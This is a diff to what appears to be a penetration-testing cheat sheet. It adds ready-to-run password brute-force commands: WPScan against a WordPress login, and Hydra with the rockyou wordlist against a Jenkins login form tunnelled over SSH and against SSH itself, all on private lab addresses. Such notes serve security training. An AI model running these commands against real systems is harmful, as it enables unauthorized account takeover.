@@ -329,9 +329,20 @@ Then you just have to look and wait in your lister terminal for 1 min.
 
 <b>Brute Force Wordpress Login</b>
 
+<b>WPScan</b>
+
 <code>wpscan --url http://10.10.20.20/blog -U admin -P /opt/wordlists/rockyou.txt -t 20</code>
 
+<b>Hydra</b>
 
+<b>example - Jenkins</b>
+
+<b>In this example we are passing the traffic over a SSH Tunnel on port 4444
+<code>hydra -l admin -P /opt/wordlists/rockyou.txt 127.0.0.1 http-post-form '/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:loginError' -I -s 4444</code>
+
+<b>example - ssh</b>
+
+<code>hydra -l admin -P /opt/wordlists/rockyou.txt ssh://10.10.20.20</code>
 
 <br><h1>Password Cracking</h1>
 
